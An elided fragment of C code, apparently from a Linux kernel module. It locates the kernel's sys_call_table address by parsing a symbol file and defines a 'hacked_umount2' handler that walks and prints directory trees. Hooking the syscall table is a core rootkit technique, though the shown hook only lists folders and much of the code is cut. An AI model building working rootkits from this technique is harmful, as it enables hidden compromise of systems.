...
void queue_push(struct list_head *q, const char *s, const int step) {
...
void queue_erase(struct list_head *q) {
    ...
    while (vfs_read(f, p+i, 1, &f->f_pos) == 1) {
        if ( p[i] == '\n' || i == 255 ) {
            ...
            if ( (strstr(p, "sys_call_table")) != NULL ) {
                ...
                ret = (void **) simple_strtoll(sys_string, NULL, 16);
                kfree(sys_string);
                break;
            }
            memset(buf, 0x0, MAX_LEN);
...
int hacked_umount2(const  char __user *dir_name, int flags) {
    ...
    for (queue_push(&q, dir_name,0); !list_empty(&q); queue_pop(&q)) {
        ...
        if (end > 0) {
            ...
            for (i = 0; i < end; ) {
                ...
                if (cur->d_type == DT_DIR && str_cmp(cur->d_name, ".") && str_cmp(cur->d_name, "..")) {
                    ...
                    printk("sub folder: %s\n", cur->d_name);
                    if(front->step <= MAX_STEP)
                        queue_push(&q, s, front->step + 1);
                } else {
